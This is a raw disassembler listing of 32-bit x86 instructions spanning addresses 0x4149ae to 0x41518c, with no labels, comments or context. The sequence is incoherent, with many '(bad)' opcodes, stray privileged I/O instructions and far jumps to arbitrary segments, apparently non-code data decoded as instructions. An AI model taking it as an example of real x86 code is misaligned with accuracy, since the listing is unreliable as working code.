  4149ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149af:	aaa    
  4149b0:	imul   edx,DWORD PTR [edi+eax*1],0x18
  4149b4:	mov    bh,0x91
  4149b6:	dec    ecx
  4149b7:	out    0xfb,eax
  4149b9:	pop    ebp
  4149ba:	daa    
  4149bb:	mov    edi,0xd1c9870
  4149c0:	outs   dx,BYTE PTR ds:[esi]
  4149c1:	pop    eax
  4149c2:	xchg   edi,eax
  4149c3:	sbb    bl,dl
  4149c5:	int    0x8f
  4149c7:	push   ds
  4149c8:	mov    al,ds:0x50a9f9ad
  4149cd:	push   ss
  4149ce:	jp     0x41498a
  4149d0:	or     BYTE PTR [esi],0xb7
  4149d3:	popf   
  4149d4:	mov    ds:0x5c0b981f,eax
  4149d9:	gs iret 
  4149db:	into   
  4149dc:	xchg   esp,eax
  4149dd:	(bad)  
  4149de:	fs or  eax,0xaf824b0a
  4149e4:	lahf   
  4149e5:	mov    bl,0x66
  4149e7:	mov    esi,0x24d74637
  4149ec:	leave  
  4149ed:	xlat   BYTE PTR ds:[ebx]
  4149ee:	inc    ecx
  4149ef:	and    BYTE PTR [ebx],0x96
  4149f2:	sub    ebx,ebx
  4149f4:	xor    DWORD PTR [esi-0x18],esi
  4149f7:	mov    ah,0xd5
  4149f9:	out    0xd5,eax
  4149fb:	jecxz  0x414a53
  4149fd:	nop
  4149fe:	pop    ds
  4149ff:	cmp    BYTE PTR [ebp+0x309af630],ch
  414a05:	add    DWORD PTR [ecx],esp
  414a07:	in     eax,dx
  414a08:	pop    ebx
  414a09:	xchg   edx,eax
  414a0a:	rcl    BYTE PTR [ecx+eiz*2-0x80],1
  414a0e:	pop    eax
  414a0f:	mov    BYTE PTR [ebp+0x3d],bh
  414a12:	push   esp
  414a13:	dec    edx
  414a14:	xchg   ebp,eax
  414a15:	and    al,0xa9
  414a17:	xchg   ebx,eax
  414a18:	jl     0x414a24
  414a1a:	inc    ebx
  414a1b:	inc    esp
  414a1c:	(bad)  
  414a1d:	xor    BYTE PTR [ebx+0x4c],dl
  414a20:	xor    BYTE PTR [eax-0x34],al
  414a23:	imul   esi,DWORD PTR ds:0x80086a01,0x3ee65148
  414a2d:	stos   DWORD PTR es:[edi],eax
  414a2e:	xchg   ebp,eax
  414a2f:	and    ebp,DWORD PTR [ecx-0x3c]
  414a32:	pop    esp
  414a33:	dec    edx
  414a34:	jbe    0x414a2e
  414a36:	xchg   BYTE PTR [ebx],ch
  414a38:	cs leave 
  414a3a:	mov    eax,ds:0x9cfa4e21
  414a3f:	adc    eax,0x6196998d
  414a44:	test   al,0xeb
  414a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a47:	in     eax,dx
  414a48:	mov    edi,0x5a6c1927
  414a4d:	and    eax,DWORD PTR [edi-0x17]
  414a50:	sub    esp,DWORD PTR [ecx]
  414a52:	mov    eax,ds:0x439b546c
  414a57:	call   0x3b7b193
  414a5c:	scas   eax,DWORD PTR es:[edi]
  414a5d:	jle    0x414a0a
  414a5f:	or     dh,ah
  414a61:	lea    edi,[ebx+ebp*1]
  414a64:	jae    0x414ab5
  414a66:	adc    DWORD PTR [edx],0xffffff8d
  414a69:	add    DWORD PTR [esi+0x1a],esi
  414a6c:	in     eax,dx
  414a6d:	in     al,dx
  414a6e:	test   DWORD PTR [edx+0x28],0x1ff14075
  414a75:	mov    ebp,0xd4a7c1b7
  414a7a:	mov    edx,0x7f129239
  414a7f:	pop    eax
  414a80:	mov    dh,0x8a
  414a82:	fs push edi
  414a84:	fbstp  TBYTE PTR [eax+0x407526a0]
  414a8a:	loopne 0x414b03
  414a8c:	out    0x82,al
  414a8e:	pop    esp
  414a8f:	jg     0x414a6a
  414a91:	adc    al,0xe5
  414a93:	adc    eax,0xe1ab7de4
  414a98:	push   edi
  414a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a9a:	jl     0x414a5e
  414a9c:	xor    DWORD PTR [ecx-0x1f2aa1e2],esi
  414aa2:	sti    
  414aa3:	pop    ecx
  414aa4:	ficomp DWORD PTR [edi+ebx*4+0x7366d581]
  414aab:	or     cl,BYTE PTR [ebx-0x10c8e06a]
  414ab1:	cwde   
  414ab2:	xchg   edi,eax
  414ab3:	inc    edi
  414ab4:	jge    0x414b0d
  414ab6:	mov    eax,ds:0xbc54bb92
  414abb:	adc    BYTE PTR [ebp-0x27],dh
  414abe:	fwait
  414abf:	lahf   
  414ac0:	iret   
  414ac1:	dec    esp
  414ac2:	retf   0x74c6
  414ac5:	div    BYTE PTR [edi+0x406af1d3]
  414acb:	out    dx,eax
  414acc:	mov    edx,0xebb81dac
  414ad2:	ins    DWORD PTR es:[edi],dx
  414ad3:	or     al,0x21
  414ad5:	dec    ecx
  414ad6:	(bad)  [esi]
  414ad8:	add    esp,0xc56ad05c
  414ade:	xchg   esi,eax
  414adf:	or     cl,BYTE PTR [esi+0x55]
  414ae2:	jne    0x414ad9
  414ae4:	mov    ch,0xb2
  414ae6:	or     BYTE PTR [ebp+0x46],al
  414ae9:	sub    DWORD PTR [edi+0x23],0x531d0e24
  414af0:	pop    ebp
  414af1:	(bad)  
  414af2:	lock iret 
  414af4:	adc    esp,DWORD PTR [esi-0x54]
  414af7:	inc    edx
  414af8:	push   cs
  414af9:	repz sub DWORD PTR [esp+ecx*8],eax
  414afd:	xchg   esi,eax
  414afe:	or     bl,BYTE PTR [edx+0x263c084e]
  414b04:	xor    DWORD PTR [ecx],0x5ffc2a8f
  414b0a:	mov    esp,0xd5be97e8
  414b0f:	scas   al,BYTE PTR es:[edi]
  414b10:	fbld   TBYTE PTR [ebx+edx*4-0x56]
  414b14:	xlat   BYTE PTR ds:[ebx]
  414b15:	or     bh,dh
  414b17:	mov    eax,ds:0xac1f0527
  414b1c:	ror    bl,0x83
  414b1f:	loop   0x414b7e
  414b21:	fcmovb st,st(2)
  414b24:	hlt    
  414b25:	pop    esp
  414b26:	pusha  
  414b27:	sbb    al,0x67
  414b29:	repnz dec ecx
  414b2b:	aaa    
  414b2c:	sub    eax,DWORD PTR [esi+0x5d3ecfe2]
  414b32:	ret    0x5e24
  414b35:	aad    0x77
  414b37:	pop    es
  414b38:	jmp    0x3061:0x35d2e74b
  414b3f:	inc    ebp
  414b40:	sbb    BYTE PTR [eax-0x149bd172],0x41
  414b47:	push   ds
  414b48:	jno    0x414bba
  414b4a:	mov    eax,0x36214cfb
  414b4f:	fndisi(8087 only) 
  414b51:	pushf  
  414b52:	popa   
  414b53:	mov    ecx,0x731b1f59
  414b58:	mov    ah,0x2a
  414b5a:	inc    ecx
  414b5b:	cs je  0x414bab
  414b5e:	xchg   ecx,eax
  414b5f:	mov    ch,0x6a
  414b61:	clc    
  414b62:	scas   al,BYTE PTR es:[edi]
  414b63:	mov    ebp,?
  414b65:	repz adc al,0xcc
  414b68:	jmp    0xf04f:0x9889a890
  414b6f:	ret    
  414b70:	(bad)  
  414b71:	cs sbb ch,ch
  414b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b75:	sbb    esp,DWORD PTR [ebp-0x7f6f3e58]
  414b7b:	lea    edx,[ebx-0x70]
  414b7e:	out    0x8c,al
  414b80:	add    eax,0x39cb61a4
  414b85:	outs   dx,DWORD PTR ds:[esi]
  414b86:	jmp    0xe0c667fe
  414b8b:	adc    edx,DWORD PTR [ebp+0x444bc614]
  414b91:	fldcw  WORD PTR [ecx+0x48]
  414b94:	inc    esi
  414b95:	jmp    0xd482:0x1a09b42
  414b9c:	mov    esp,0xebfeaa2
  414ba1:	out    0x7c,al
  414ba3:	ds popf 
  414ba5:	fxam   
  414ba7:	or     al,BYTE PTR [ebx-0x498c7f29]
  414bad:	or     edx,DWORD PTR [ecx-0xc]
  414bb0:	lock mov edi,0x23b3a591
  414bb6:	jge    0x414bc9
  414bb8:	fild   QWORD PTR [ecx]
  414bba:	add    ax,0x723f
  414bbe:	pop    edx
  414bbf:	sub    eax,0x4280dfb1
  414bc4:	(bad)  
  414bc5:	sbb    eax,0xfe8caa
  414bca:	ret    0xad4
  414bcd:	call   0xc21b2aa2
  414bd2:	outs   dx,DWORD PTR ds:[esi]
  414bd4:	cmp    DWORD PTR [ebx-0x51e6bbd8],esi
  414bda:	mov    ah,BYTE PTR [eax+0x70]
  414bdd:	and    eax,0xe8bdcf07
  414be2:	and    DWORD PTR [eax-0x2e6dd4c7],eax
  414be8:	leave  
  414be9:	mov    esi,0x8f2aaf87
  414bee:	ret    0x111
  414bf1:	and    BYTE PTR [esi],al
  414bf3:	fadd   QWORD PTR [ecx-0x108ce9b6]
  414bf9:	enter  0x99a8,0xc4
  414bfd:	add    BYTE PTR [ebp+0x26],bl
  414c00:	daa    
  414c01:	mov    cl,al
  414c03:	sbb    ebx,DWORD PTR [ebx]
  414c05:	test   bl,0x6
  414c08:	jmp    0x2631:0x93a5d753
  414c0f:	mov    al,0xf2
  414c11:	jg     0x414bcb
  414c13:	ret    
  414c14:	shr    BYTE PTR es:[esi+ecx*8-0x65bb9fcf],0xdf
  414c1d:	mov    esp,0x507853e2
  414c22:	in     al,dx
  414c23:	dec    ebp
  414c24:	out    0xb4,eax
  414c26:	push   ss
  414c27:	outs   dx,DWORD PTR ds:[esi]
  414c28:	push   edi
  414c29:	test   al,0xab
  414c2b:	rcr    DWORD PTR [ebp+0x29],0x5a
  414c2f:	or     esi,ebp
  414c31:	pop    es
  414c32:	aam    0xf4
  414c34:	in     al,dx
  414c35:	iret   
  414c36:	je     0x414ca3
  414c38:	jmp    0x858c:0x694fbf94
  414c3f:	add    edi,DWORD PTR [edi+0x18444799]
  414c45:	nop
  414c46:	mov    bl,0xf8
  414c48:	mov    ds:0x805adcb,eax
  414c4d:	mov    eax,0x819db30c
  414c52:	aaa    
  414c53:	sbb    DWORD PTR [edx+ecx*4-0x20],ebp
  414c57:	inc    esi
  414c58:	mov    edx,0x7a66a172
  414c5d:	mov    ecx,0xf39b94e
  414c62:	leave  
  414c63:	inc    ebp
  414c64:	in     al,dx
  414c65:	mov    al,0x16
  414c67:	push   0x4a24e700
  414c6c:	nop
  414c6d:	adc    DWORD PTR [ebx+0x2f],ebp
  414c70:	inc    esp
  414c71:	cld    
  414c72:	cs push es
  414c74:	add    eax,esp
  414c76:	lods   al,BYTE PTR ds:[esi]
  414c77:	push   esp
  414c78:	cmc    
  414c79:	imul   esp
  414c7b:	push   ecx
  414c7c:	addr16 loop 0x414c6f
  414c7f:	les    edx,FWORD PTR [ecx+0x14]
  414c82:	out    0x44,eax
  414c84:	mov    esp,0x44d325ff
  414c89:	jp     0x414c1d
  414c8b:	or     dh,BYTE PTR [ebx+0x7139bfcc]
  414c91:	sub    eax,0x60f15540
  414c96:	xchg   ecx,eax
  414c97:	test   BYTE PTR [ebp+0x7e],ah
  414c9a:	sbb    ch,BYTE PTR ds:0x82ae66f
  414ca0:	rol    BYTE PTR [ebp+0x5b57cdb],1
  414ca6:	mov    esp,0x2c05cf83
  414cab:	dec    esi
  414cac:	ror    BYTE PTR [edi-0x764d170d],0x50
  414cb3:	jmp    0x414c89
  414cb5:	push   ecx
  414cb6:	and    eax,DWORD PTR [ecx+0x75]
  414cb9:	(bad)  
  414cba:	out    dx,al
  414cbb:	pop    esi
  414cbc:	into   
  414cbd:	or     ecx,ecx
  414cbf:	jl     0x414c5e
  414cc1:	out    0x7,al
  414cc3:	adc    bh,BYTE PTR [edi+0x5bc1ae4a]
  414cc9:	shr    DWORD PTR [ebx-0x3bcacd42],1
  414ccf:	or     bl,dl
  414cd1:	int    0xbb
  414cd3:	adc    DWORD PTR [eax-0x53],0x67
  414cd7:	xor    BYTE PTR [eax+0x29],dh
  414cda:	pop    ss
  414cdb:	and    al,0x6d
  414cdd:	mov    al,ds:0xbab8ddc0
  414ce2:	stos   DWORD PTR es:[edi],eax
  414ce3:	addr16 mov bh,0xbb
  414ce6:	out    0xac,eax
  414ce8:	mov    ds:0x7446e661,al
  414ced:	inc    ecx
  414cee:	adc    DWORD PTR [ecx+ecx*1-0x57],ebx
  414cf2:	xchg   ebx,eax
  414cf3:	rcl    BYTE PTR [ebp+esi*2+0x2d50795d],0x55
  414cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cfc:	int    0x51
  414cfe:	and    edx,DWORD PTR [esi+eax*8]
  414d01:	je     0x414c89
  414d03:	ret    0xe107
  414d06:	inc    edx
  414d07:	int3   
  414d08:	hlt    
  414d09:	and    al,0xa3
  414d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d0c:	outs   dx,DWORD PTR ds:[esi]
  414d0d:	test   eax,0x7b10a82d
  414d12:	jmp    0x414c96
  414d14:	retf   
  414d15:	mov    ch,0xd2
  414d17:	dec    esp
  414d18:	or     cl,cl
  414d1a:	dec    ebx
  414d1b:	in     eax,0xdc
  414d1d:	pop    ebx
  414d1e:	pop    edx
  414d1f:	or     al,0xa8
  414d21:	lods   eax,DWORD PTR ds:[esi]
  414d22:	and    ah,BYTE PTR [edx+0x346367de]
  414d28:	les    eax,FWORD PTR [eax-0x6ea98222]
  414d2e:	lods   eax,DWORD PTR ds:[esi]
  414d2f:	dec    ecx
  414d30:	mov    esp,0x9be983d8
  414d35:	or     DWORD PTR ds:0xecd71a27,0xe1e71688
  414d3f:	add    al,0xdb
  414d41:	push   ebp
  414d42:	cmp    al,0x8c
  414d44:	ins    BYTE PTR es:[edi],dx
  414d45:	out    0x8c,al
  414d47:	xor    BYTE PTR [edi+0x826f1ec],cl
  414d4d:	jp     0x414d7d
  414d4f:	cmp    al,0x72
  414d51:	test   al,0xb8
  414d53:	fistp  DWORD PTR [ecx]
  414d55:	lods   eax,DWORD PTR ds:[esi]
  414d56:	mov    ch,0xcf
  414d58:	push   ecx
  414d59:	jnp    0x414da2
  414d5b:	outs   dx,BYTE PTR ds:[esi]
  414d5c:	sar    DWORD PTR [esi-0x68],0xee
  414d60:	ss cli 
  414d62:	push   ss
  414d63:	push   esp
  414d64:	ret    0x5a41
  414d67:	inc    esi
  414d68:	cwde   
  414d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d6a:	jnp    0x414d41
  414d6c:	ror    bl,1
  414d6e:	icebp  
  414d6f:	(bad)  
  414d70:	int    0x27
  414d72:	sub    esi,DWORD PTR ds:0xfc84def4
  414d78:	xchg   DWORD PTR [ecx+0x65638d9d],esp
  414d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d7f:	das    
  414d80:	outs   dx,BYTE PTR ds:[esi]
  414d81:	jae    0x414da8
  414d83:	push   ecx
  414d84:	push   eax
  414d85:	(bad)  
  414d87:	jp     0x414dae
  414d89:	hlt    
  414d8a:	lods   al,BYTE PTR ds:[esi]
  414d8b:	dec    edi
  414d8c:	pushf  
  414d8d:	dec    edi
  414d8e:	(bad)  
  414d8f:	dec    ebp
  414d90:	jp     0x414dc7
  414d92:	sbb    eax,0xe5849f5f
  414d97:	dec    ebp
  414d98:	ss xchg esp,eax
  414d9a:	adc    BYTE PTR [ebx-0x2515392e],0x8a
  414da1:	xor    DWORD PTR [edx],0xffffffe8
  414da4:	rcl    BYTE PTR [ebx],0x9e
  414da7:	popa   
  414da8:	add    eax,0xa5b2a938
  414dad:	dec    ebp
  414dae:	out    0xd,eax
  414db0:	adc    BYTE PTR [ebx],dl
  414db2:	or     al,BYTE PTR [esi-0x5e1bd8e7]
  414db8:	and    BYTE PTR [esi],0x64
  414dbb:	shl    DWORD PTR [ebp+0x59],cl
  414dbe:	jg     0x414d72
  414dc0:	cmp    eax,0xa32f7250
  414dc5:	jb     0x414d69
  414dc7:	jge    0x414de2
  414dc9:	add    BYTE PTR ds:0x2a05654c,dh
  414dcf:	cmp    DWORD PTR [edi],0x64fca84f
  414dd5:	push   ecx
  414dd6:	xchg   edi,eax
  414dd7:	stos   BYTE PTR es:[edi],al
  414dd8:	leave  
  414dd9:	or     al,0x8d
  414ddb:	xchg   esi,eax
  414ddc:	pushf  
  414ddd:	loop   0x414e33
  414ddf:	add    al,0x86
  414de1:	retf   0x4d8e
  414de4:	cdq    
  414de5:	lods   al,BYTE PTR ds:[esi]
  414de6:	inc    ebp
  414de7:	lds    edx,FWORD PTR [edx+0x3052eb46]
  414ded:	mov    cl,al
  414def:	sub    al,0xe6
  414df1:	clc    
  414df2:	mov    ebx,0x5cf2c791
  414df7:	sbb    eax,0x1e7ab1d1
  414dfc:	pop    ebx
  414dfd:	add    BYTE PTR [esi-0x6a],bl
  414e00:	(bad)  
  414e01:	mov    edx,0xe7cb5265
  414e06:	into   
  414e07:	sti    
  414e08:	push   cs
  414e09:	cwde   
  414e0a:	mov    ds:0x2a28be7e,al
  414e0f:	shr    DWORD PTR [ecx+0x189ee037],cl
  414e15:	inc    ecx
  414e16:	mov    ecx,0x62b8bd62
  414e1b:	dec    edi
  414e1c:	sbb    eax,0x5f79bb8b
  414e21:	outs   dx,BYTE PTR ds:[esi]
  414e22:	cmp    al,0xa1
  414e24:	fwait
  414e25:	jg     0x414e07
  414e27:	out    0x2c,al
  414e29:	or     ebp,DWORD PTR [ecx-0x48a415ed]
  414e2f:	xchg   esi,eax
  414e30:	and    BYTE PTR [ebx+ebx*1+0x1b],dh
  414e34:	enter  0xa032,0xa4
  414e38:	sti    
  414e39:	xchg   esp,eax
  414e3a:	(bad)  
  414e3b:	sub    BYTE PTR [ebx+0x316d898a],dl
  414e41:	xor    DWORD PTR [ebx],edi
  414e43:	pop    ecx
  414e44:	jmp    0x414e66
  414e46:	into   
  414e47:	mov    DWORD PTR [ebp+edi*2+0x3e],esi
  414e4b:	mov    edi,0x481ee90b
  414e50:	std    
  414e51:	out    0x80,al
  414e53:	dec    esi
  414e54:	jno    0x414e35
  414e56:	pop    ebx
  414e57:	mov    dl,0x3a
  414e59:	ss addr16 jge 0x414e72
  414e5d:	and    DWORD PTR [edx+edx*4],ebp
  414e60:	rol    bl,1
  414e62:	jnp    0x414e1a
  414e64:	scas   eax,DWORD PTR es:[edi]
  414e65:	out    dx,al
  414e66:	test   eax,0x35f5aef0
  414e6b:	ror    BYTE PTR [ebp+0x6e7174d5],1
  414e71:	jno    0x414e6e
  414e73:	shr    BYTE PTR [esi+0x25c85ca0],0x31
  414e7a:	and    eax,0x702bc66
  414e7f:	test   eax,0x3072e0da
  414e84:	in     al,dx
  414e85:	imul   DWORD PTR [eax+0x494333bf]
  414e8b:	fmul   QWORD PTR [ebx]
  414e8d:	add    al,BYTE PTR [edi]
  414e8f:	cmc    
  414e90:	mov    BYTE PTR [ebx+0x74],cl
  414e93:	out    dx,al
  414e94:	inc    ebp
  414e95:	sub    eax,0x8c5cb4c1
  414e9a:	jbe    0x414e5f
  414e9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e9d:	push   es
  414e9e:	or     ah,BYTE PTR [ecx-0x36cc425f]
  414ea4:	mov    cl,0x36
  414ea6:	shr    BYTE PTR [eax+0x60232c9a],0x95
  414ead:	jg     0x414e3b
  414eaf:	jmp    0x5c71:0xed8c323b
  414eb6:	xor    al,0x6c
  414eb8:	inc    edi
  414eb9:	mov    esi,0x68527d18
  414ebe:	xlat   BYTE PTR ds:[ebx]
  414ebf:	fnstsw WORD PTR ds:0x6214fc42
  414ec5:	jbe    0x414f29
  414ec7:	mov    esp,0x997c0993
  414ecc:	xor    cl,bl
  414ece:	mov    WORD PTR [ebx-0x4f381a1e],cs
  414ed4:	jne    0x414eef
  414ed6:	mov    dh,BYTE PTR [ecx+0x14]
  414ed9:	pop    ecx
  414eda:	inc    edx
  414edb:	in     al,0xb5
  414edd:	add    ebp,DWORD PTR [eax-0x23]
  414ee0:	fmul   QWORD PTR [edi-0x1e]
  414ee3:	push   esp
  414ee4:	inc    eax
  414ee5:	in     al,dx
  414ee6:	inc    esi
  414ee7:	mov    al,0x70
  414ee9:	mov    ebx,0xd8e6ac23
  414eee:	lea    edi,[ebx-0xa]
  414ef1:	sub    DWORD PTR [ecx+0x53aa44e3],ecx
  414ef7:	inc    edi
  414ef8:	iret   
  414ef9:	or     ch,BYTE PTR [ecx]
  414efb:	rcr    DWORD PTR [ecx+0x30a41ca],0xa4
  414f02:	setg   BYTE PTR ds:0xe5906c0e
  414f09:	pop    ss
  414f0a:	std    
  414f0b:	push   ebx
  414f0c:	iret   
  414f0d:	arpl   bp,bx
  414f0f:	stos   BYTE PTR es:[edi],al
  414f10:	cmovg  edi,DWORD PTR [edi-0x2]
  414f14:	cmc    
  414f15:	loope  0x414ee8
  414f17:	retf   0x7391
  414f1a:	mov    ecx,0xffcb9c20
  414f1f:	mov    cl,BYTE PTR [esi+0x5535a4c9]
  414f25:	les    edx,FWORD PTR [edx]
  414f27:	fild   QWORD PTR [ecx]
  414f29:	ins    DWORD PTR es:[edi],dx
  414f2a:	lahf   
  414f2b:	push   ecx
  414f2c:	jno    0x414eef
  414f2e:	push   ss
  414f2f:	sahf   
  414f30:	adc    al,0x80
  414f32:	xor    DWORD PTR [edx],0xffffff8c
  414f35:	xor    al,al
  414f37:	aaa    
  414f38:	pmullw mm2,QWORD PTR [ebx-0x5fffdfea]
  414f3f:	cld    
  414f40:	mov    al,ds:0x5780af28
  414f45:	xchg   edx,eax
  414f46:	dec    esp
  414f47:	test   eax,0x73f32b6e
  414f4c:	test   DWORD PTR [ecx+0x564a842d],ebp
  414f52:	sbb    al,0xa5
  414f54:	into   
  414f55:	mov    dh,0x28
  414f57:	inc    esp
  414f58:	or     DWORD PTR [ebp-0x34],ebp
  414f5b:	ins    BYTE PTR es:[edi],dx
  414f5c:	add    BYTE PTR ds:[ebx],dh
  414f5f:	aad    0x2c
  414f61:	je     0x414f21
  414f63:	inc    ecx
  414f64:	mov    edi,0x21758049
  414f69:	dec    esi
  414f6a:	leave  
  414f6b:	icebp  
  414f6c:	jl     0x414f22
  414f6e:	addr16 in al,dx
  414f70:	into   
  414f71:	pop    ss
  414f72:	push   edi
  414f73:	test   eax,0x1b8d80c
  414f78:	(bad)  
  414f79:	mov    ah,0x4
  414f7b:	add    eax,ebp
  414f7d:	aad    0xec
  414f7f:	dec    edx
  414f80:	pushf  
  414f81:	not    DWORD PTR [esi+0x60]
  414f84:	adc    ch,BYTE PTR [edx-0x2af51957]
  414f8a:	pop    edi
  414f8b:	stos   BYTE PTR es:[edi],al
  414f8c:	pop    ss
  414f8d:	jo     0x414f85
  414f8f:	sbb    DWORD PTR [ebx-0x6b08b218],ecx
  414f95:	pop    ss
  414f96:	xchg   ecx,eax
  414f97:	div    bh
  414f99:	cmp    DWORD PTR [esi+0x45],eax
  414f9c:	dec    edx
  414f9d:	repz data16 clc 
  414fa0:	mov    ds:0xa667bb46,eax
  414fa5:	gs inc esi
  414fa7:	lahf   
  414fa8:	add    DWORD PTR gs:[ecx],eax
  414fab:	xor    bh,BYTE PTR [esp+eax*8-0x732f977]
  414fb2:	cmp    bl,BYTE PTR [ecx+0x2593320]
  414fb8:	sar    edx,1
  414fba:	cld    
  414fbb:	sub    eax,0xffed1a91
  414fc0:	lods   al,BYTE PTR ds:[esi]
  414fc1:	lahf   
  414fc2:	pop    edx
  414fc3:	aam    0xc8
  414fc5:	or     bl,ah
  414fc7:	into   
  414fc8:	pop    ebx
  414fc9:	cdq    
  414fca:	test   DWORD PTR [edi-0x3a40515c],esp
  414fd0:	imul   ecx,esp,0xe57e99ce
  414fd6:	push   ecx
  414fd7:	mov    eax,0x2f226dd5
  414fdc:	stc    
  414fdd:	push   0x7e
  414fdf:	sbb    dh,BYTE PTR [edx-0xa]
  414fe2:	ja     0x41504f
  414fe4:	ja     0x414fd5
  414fe6:	adc    al,0xa0
  414fe8:	mov    edi,0xbbedd11d
  414fed:	repz retf 
  414fef:	iret   
  414ff0:	push   esi
  414ff1:	inc    esp
  414ff2:	jbe    0x414f87
  414ff4:	mov    eax,ds:0x739059a5
  414ff9:	(bad)  
  414ffa:	outs   dx,DWORD PTR ds:[esi]
  414ffb:	xor    dh,BYTE PTR [edx+0xc81e839]
  415001:	xchg   esp,eax
  415002:	ins    DWORD PTR es:[edi],dx
  415003:	mov    cl,0xd9
  415005:	sub    al,0x1e
  415007:	popa   
  415008:	les    edi,FWORD PTR [ebp+0x17]
  41500b:	xchg   DWORD PTR [edx+esi*4+0x51117c5d],ecx
  415012:	stc    
  415013:	jbe    0x415021
  415015:	mov    esi,0xfd6a7fae
  41501a:	scas   eax,DWORD PTR es:[edi]
  41501b:	or     esi,DWORD PTR ds:[ebp-0x24]
  41501f:	adc    eax,0xda660f14
  415024:	cs cmc 
  415026:	cmp    DWORD PTR [ebx+0x36344312],edi
  41502c:	data16 in al,dx
  41502e:	adc    DWORD PTR [edi-0x2af4dd0],edi
  415034:	inc    edx
  415035:	jmp    0xd1300d9c
  41503a:	sub    BYTE PTR [edx],bh
  41503c:	push   ds
  41503d:	int3   
  41503e:	and    al,0x78
  415040:	test   BYTE PTR [eax],0xd4
  415043:	and    ebx,ebp
  415045:	dec    esp
  415046:	xor    al,BYTE PTR [edi]
  415048:	scas   eax,DWORD PTR es:[edi]
  415049:	jge    0x415096
  41504b:	cmp    BYTE PTR [edx+0x42fff498],al
  415051:	call   0xf8d6:0x124cedda
  415058:	sbb    DWORD PTR [ecx],ecx
  41505a:	int    0xc6
  41505c:	in     eax,0x91
  41505e:	test   eax,edi
  415060:	cmp    al,0x38
  415062:	adc    eax,DWORD PTR [eax+0x3658715]
  415068:	xchg   ebp,eax
  415069:	and    esi,DWORD PTR [eax+edi*8+0x1167117d]
  415070:	inc    ecx
  415071:	xor    ecx,DWORD PTR [edi-0x55]
  415074:	inc    eax
  415075:	sbb    al,0x95
  415077:	pop    esi
  415078:	push   edi
  415079:	out    0x99,eax
  41507b:	jns    0x4150b3
  41507d:	lds    edi,FWORD PTR [ecx]
  41507f:	retf   0xb1af
  415082:	pop    eax
  415083:	das    
  415084:	sub    dl,bh
  415086:	inc    ebx
  415087:	sbb    al,BYTE PTR [edi]
  415089:	mov    al,0x5d
  41508b:	inc    eax
  41508c:	add    BYTE PTR [eax],ch
  41508e:	shr    BYTE PTR [ebp-0x6d],cl
  415091:	xchg   ebp,eax
  415092:	mov    dh,0x87
  415094:	iret   
  415095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415096:	jne    0x4150c6
  415098:	daa    
  415099:	add    ebp,DWORD PTR [edi]
  41509b:	call   0x356e9b69
  4150a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150a1:	add    DWORD PTR [esi+0x37],esi
  4150a4:	(bad)  
  4150a5:	(bad)  
  4150a6:	mov    DWORD PTR [ebp+0x2e0b4d76],0x3e4e95c5
  4150b0:	inc    ecx
  4150b1:	jae    0x4150be
  4150b3:	lahf   
  4150b4:	cmp    BYTE PTR [ebx-0x55a2d517],dl
  4150ba:	fs jg  0x4150e9
  4150bd:	imul   ebp,DWORD PTR [edx-0x40ef514],0x43
  4150c4:	add    esi,DWORD PTR [ebx]
  4150c6:	xchg   edi,eax
  4150c7:	inc    ebp
  4150c8:	loope  0x4150df
  4150ca:	cmc    
  4150cb:	lods   al,BYTE PTR ds:[esi]
  4150cc:	dec    ebp
  4150cd:	xchg   esi,edi
  4150cf:	push   0x86210eff
  4150d4:	test   BYTE PTR cs:[edx-0x369b8eb6],bh
  4150db:	nop
  4150dc:	xchg   ebp,eax
  4150dd:	cmp    cl,BYTE PTR [eax]
  4150df:	jmp    0xfbf226d3
  4150e4:	mov    ecx,0xcb1b2a88
  4150e9:	in     eax,dx
  4150ea:	addr16 iret 
  4150ec:	add    BYTE PTR [esi+0x6152b3b9],cl
  4150f2:	push   edi
  4150f3:	pop    esi
  4150f4:	cld    
  4150f5:	retf   0x1f20
  4150f8:	stos   DWORD PTR es:[edi],eax
  4150f9:	push   0xf6e82052
  4150fe:	je     0x4150d9
  415100:	loop   0x415173
  415102:	lods   al,BYTE PTR ds:[esi]
  415103:	aaa    
  415104:	dec    eax
  415105:	pushf  
  415106:	ror    DWORD PTR [ebx+0x11b90433],0x13
  41510d:	xor    cl,BYTE PTR [esi-0x595a50ba]
  415113:	out    0xfc,al
  415115:	pop    edi
  415116:	inc    ebx
  415117:	jne    0x4150c0
  415119:	adc    ecx,ebx
  41511b:	mov    bh,0xdd
  41511d:	cmp    al,0xc4
  41511f:	and    bh,BYTE PTR ds:0xc7712ba0
  415125:	adc    al,0x5a
  415127:	mov    ah,0x17
  415129:	call   0xa196e3e1
  41512e:	sbb    bl,0x8e
  415131:	xor    dl,bl
  415133:	mov    ah,0xe3
  415135:	mov    WORD PTR [edi],cs
  415137:	int3   
  415138:	jmp    0xb32c:0xadd74669
  41513f:	or     ebx,DWORD PTR [eax+edx*8]
  415142:	sub    eax,0x4b0af762
  415147:	push   0x8ad1136e
  41514c:	adc    eax,0xa4024caa
  415151:	pop    eax
  415152:	jo     0x41512b
  415154:	je     0x415127
  415156:	(bad)  
  415157:	xor    DWORD PTR [esi+0x665f9a80],ebx
  41515d:	gs mov al,0x46
  415160:	call   0x749a0eb7
  415165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415166:	dec    eax
  415167:	jl     0x4150f3
  415169:	test   al,0x73
  41516b:	mov    edx,ebx
  41516d:	sub    BYTE PTR [edi-0x7d],ch
  415170:	imul   esp,DWORD PTR [ecx-0x71],0x2d
  415174:	imul   esp,ecx,0x14dbe750
  41517a:	mov    dl,0x7a
  41517c:	dec    esp
  41517d:	push   0xb1d736b0
  415182:	retf   
  415183:	add    al,BYTE PTR [eax-0x4d]
  415186:	pop    ds
  415187:	cmp    eax,ecx
  415189:	jecxz  0x4151e7
  41518b:	lahf   
  41518c:	lock sub ah,BYTE PTR [esi+0x79ec2451]
